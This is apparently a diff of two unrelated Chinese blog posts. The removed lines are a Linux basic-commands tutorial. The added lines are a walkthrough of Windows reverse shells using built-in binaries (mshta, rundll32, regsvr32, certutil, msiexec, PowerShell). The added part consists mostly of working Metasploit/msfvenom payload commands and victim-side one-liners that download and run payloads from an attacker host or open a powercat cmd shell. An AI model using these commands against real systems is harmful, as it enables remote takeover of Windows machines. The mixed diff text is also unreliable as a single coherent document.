+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
+<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
+<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>
 
-<p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的：替换为+</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/5.png"></p>
-<p><code>cat passwd |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/6.png"></p>
-<p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/7.png"></p>
-<p>以上这些命令中是以/做为该命令的定界符，如果需要修改或者匹配的字段带有/则不能再使用/做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。</p>
-<p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p>
-<p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/Users\46003\AppData\Roaming\Typora\typora-user-images\image-20220509195350587.png" alt="image-20220509195350587"></p>
-<p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/8.png"></p>
-<p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/9.png"></p>
-<p><code>sed &#39;/^192/&#39;d</code> 删除文件中所有开头是192的行。</p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/10.png"></p>
-<h4 id="2-3-grep-命令"><a href="#2-3-grep-命令" class="headerlink" title="2.3 grep 命令"></a>2.3 grep 命令</h4><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p>
-<p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p>
-<p>命令格式： <code>grep [options] [pattern]　[filename]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |grep root                          <span class="comment"># 只显示带有root关键字的行</span></span><br><span class="line">grep -e root passwd                            <span class="comment"># 匹配有root的行</span></span><br><span class="line">grep -v root passwd                            <span class="comment"># 忽略匹配到的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&quot;root|sshd&quot;</span>                <span class="comment"># 包含多个可能性的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;^r&#x27;</span>                       <span class="comment"># 以r开头的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;n$&#x27;</span>                       <span class="comment"># 以n结尾的行</span></span><br><span class="line">grep “root” /etc/passwd /etc/shad ow            <span class="comment"># 查询多个文件</span></span><br><span class="line">grep <span class="string">&quot;passwd&quot;</span> /etc -rn                         <span class="comment"># -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
+<blockquote>
+<p>Tips:</p>
+<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
+<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
+</blockquote>
+<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/11.png"></p>
-<h4 id="2-4-find-命令"><a href="#2-4-find-命令" class="headerlink" title="2.4 find 命令"></a>2.4 find 命令</h4><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
-<p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -size 1000k                <span class="comment">#从根目录查找大小为1000K的文件</span></span><br><span class="line">find   -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#在当前目录下查找文件名以1开始的文件</span></span><br><span class="line">find / -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#从根目录查找文件名以1开始的文件</span></span><br><span class="line">find / -user root            	  <span class="comment">#从根目录查找属主为root的文件</span></span><br><span class="line">find / -group root                <span class="comment">#从根目录查找属组为root的文件</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f/d               <span class="comment">#按sock类型查找，f代表文件，d代表目录</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mtime -7          <span class="comment">#搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mmin -10          <span class="comment">#搜索10分钟内当前目录下修改过的文件 </span></span><br><span class="line">find . -atime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -amin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内被访问的文件</span></span><br><span class="line">find . -ctime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -cmin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内状态被改变的文件</span></span><br><span class="line">find . -perm 777                  <span class="comment">#搜索处当前文件下符合777权限的文件</span></span><br></pre></td></tr></table></figure>
+<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
+<li>生成hta</li>
+</ol>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
+<ol start="2">
+<li><p>生成恶意站点</p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
+</li>
+</ol>
+<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
+<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>exec选项</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -<span class="built_in">exec</span> 命令2&#123;&#125;\;</span><br><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> ls -l &#123;&#125; \;</span><br><span class="line">find / -<span class="built_in">exec</span> grep <span class="string">&quot;Hello&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;*.tmp&quot;</span> -<span class="built_in">exec</span> rm -f &#123;&#125; \;           <span class="comment">#(危险)</span></span><br><span class="line">find / -name <span class="string">&quot;*&quot;</span> -ctime +2 -<span class="built_in">exec</span> rm -f &#123;&#125; \;     <span class="comment">#（危险，别敲）</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
+<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-5-ag-命令"><a href="#2-5-ag-命令" class="headerlink" title="2.5 ag 命令"></a>2.5 ag 命令</h4><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p>
-<p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ag -g &lt;File Name&gt;            <span class="comment"># 类似于 find . -name &lt;File Name&gt;</span></span><br><span class="line">ag -i PATTERN                <span class="comment"># 忽略大小写搜索含PATTERN文本</span></span><br><span class="line">ag -A [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span></span><br><span class="line">ag -B [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之前的n行文本</span></span><br><span class="line">ag -C [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span></span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   <span class="comment">#忽略某些文件目录进行搜索。</span></span><br><span class="line">ag -w PATTERN                <span class="comment">#全匹配搜索，只搜索与所搜内容完全匹配的文本。</span></span><br><span class="line">ag --java PATTERN            <span class="comment">#在java文件中搜索含PATTERN的文本。</span></span><br><span class="line">ag --xml PATTERN             <span class="comment">#在XML文件中搜索含PATTERN的</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
+<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-6-stat命令"><a href="#2-6-stat命令" class="headerlink" title="2.6 stat命令"></a>2.6 stat命令</h4><p>用于显示文件信息：</p>
-<p>用法：stat [文件或目录]</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">stat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/12.png"></p>
-<h4 id="2-7-split-命令"><a href="#2-7-split-命令" class="headerlink" title="2.7 split 命令"></a>2.7 split 命令</h4><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>
-<p>参数：</p>
-<ul>
-<li>-b 按文件大小进行切割</li>
-<li>-l 按行数来进行切割</li>
-<li>-d 为使用数字为生成文件的后缀</li>
-<li>-a 指定后缀的长度</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 30k messages    <span class="comment"># 按照每个文件30K大小切割messages文件。</span></span><br><span class="line">split -l 300 messages    <span class="comment"># 将messages文件切割为每3行一份。</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="2-8-sort命令"><a href="#2-8-sort命令" class="headerlink" title="2.8 sort命令"></a>2.8 sort命令</h4><p><code>sort</code>命令是将文件进行排序，并将排序结果标准输出。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt|sort            <span class="comment">#默认的排序方式，从首字母开始</span></span><br><span class="line">cat 1.txt|sort -t         <span class="comment">#按照字典进行排序</span></span><br><span class="line">cat 1.txt|sort -n         <span class="comment">#按照数字进行排序</span></span><br></pre></td></tr></table></figure>
+<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+<blockquote>
+<p>语法:</p>
+<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
+<p>/u - 注销服务器 </p>
+<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
+<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
+<p>/s - 沉默; 不显示消息框</p>
+</blockquote>
+<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/13.png"></p>
-<h4 id="2-9-uniq-命令"><a href="#2-9-uniq-命令" class="headerlink" title="2.9 uniq 命令"></a>2.9 uniq 命令</h4><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p>
-<p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt |sort -n |uniq              <span class="comment">#排序去重</span></span><br><span class="line">cat 1.txt|sort -n |uniq -c            <span class="comment">#列出重复的次数</span></span><br><span class="line">cat 1.txt |sort -n |uniq -d           <span class="comment">#列出有哪些行是重复的</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
+<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>
 
-<p>以上系列命令可以用于日志分析：</p>
-<p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p>
-<p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code></p>
-<h4 id="2-10-nl-命令"><a href="#2-10-nl-命令" class="headerlink" title="2.10. nl 命令"></a>2.10. nl 命令</h4><p><code>nl</code>命令用于显示文件内容行号。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |nl</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-远程连接命令"><a href="#0x03-远程连接命令" class="headerlink" title="0x03 远程连接命令"></a>0x03 远程连接命令</h3><h4 id="3-1-ssh命令"><a href="#3-1-ssh命令" class="headerlink" title="3.1 ssh命令"></a>3.1 ssh命令</h4><p><code>ssh</code>命令是Linux的远程连接工具。</p>
-<p>ssh命令：Linux的远程连接工具</p>
-<p>例如<code>ssh 192.168.2.130</code>，以当前终端用户身份远程连接IP为<code>192.168.2.130</code>的计算机。</p>
-<ul>
-<li>-l 为指定用户 如 <code>ssh -l root 192.168.2.130</code>以root用户远程登录，也可写成<code>ssh root@192.168.0.149</code></li>
-<li>-p 为指定端口号</li>
-</ul>
-<p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p>
-<p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p>
-<h4 id="3-2-linux下远程连接smb"><a href="#3-2-linux下远程连接smb" class="headerlink" title="3.2 linux下远程连接smb"></a>3.2 linux下远程连接smb</h4><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>–&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.2.130/share</code></p>
-<h4 id="3-3-rdesktop-命令"><a href="#3-3-rdesktop-命令" class="headerlink" title="3.3 rdesktop 命令"></a>3.3 rdesktop 命令</h4><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p>
-<p>用法：<code>rdesktop 192.168.0.178</code></p>
-<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
-<h3 id="0x04-URL-相关命令"><a href="#0x04-URL-相关命令" class="headerlink" title="0x04 URL 相关命令"></a>0x04 URL 相关命令</h3><p>URL，既是俗称的网址/网页链接。</p>
-<h4 id="4-1-curl-命令"><a href="#4-1-curl-命令" class="headerlink" title="4.1 curl 命令"></a>4.1 curl 命令</h4><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p>
-<p>用法：<code>curl [选项] [url]</code></p>
-<p>参数：</p>
-<ul>
-<li>-i 显示头部信息</li>
-<li>-v 显示请求全过程解析</li>
-<li>-O 下载</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">curl www.baidu.com -i</span><br><span class="line">curl www.baidu.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/14.png"></p>
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/15.png"></p>
-<h4 id="4-2-wget-命令"><a href="#4-2-wget-命令" class="headerlink" title="4.2 wget 命令"></a>4.2 wget 命令</h4><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>
 
-<p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br></pre></td></tr></table></figure>
 
-<p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p>
+
+<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
+<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
+<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>
